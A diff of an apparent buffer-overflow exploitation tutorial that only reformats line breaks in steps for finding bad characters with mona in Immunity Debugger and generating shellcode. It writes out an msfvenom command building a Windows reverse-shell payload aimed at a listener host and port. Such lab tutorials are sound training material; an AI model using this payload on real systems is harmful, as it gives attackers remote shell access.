@@ -115,10 +115,10 @@ The focus of this section is identifying bad characters so you can ensure they d
 5. Run the script
 **Command: python badcharizard.py**
 
-New Automation: 
-Go to Immunity, enter in the below command.
-**Command: !mona bytearray**
-**Command: !mona compare -f bytearray.bin -a <ESP Mem Address/Value>**
+New Automation:  
+Go to Immunity, enter in the below command.  
+**Command: !mona bytearray**  
+**Command: !mona compare -f bytearray.bin -a <ESP Mem Address/Value>**  
 ![image](https://user-images.githubusercontent.com/17016378/128985821-4903fbb3-d7b7-4151-8253-29bc22b8d6df.png)
 
 6. Go to Immunity, right-click on the ESP value, and click on "Follow in Dump."
@@ -160,8 +160,8 @@ It's time to find what pointer you need to use to direct the program to your She
 The last step in this process, generating Shellcode and ensuring that we can exploit the system.
 1. Restart Immunity/your exe program and get setup.
 2. Generate the Payload: 
-Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.82 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-Example: 
+Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.82 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"  
+Example:   
 ![image](https://user-images.githubusercontent.com/17016378/128985928-683b8556-2a94-455f-9499-5925429923c0.png)
 
 3. Replace the LHOST with your Kali Machine IP and replace the -b switch with the bad characters that you had identified earlier. In this instance, there's only one bad character represented by "\x00"
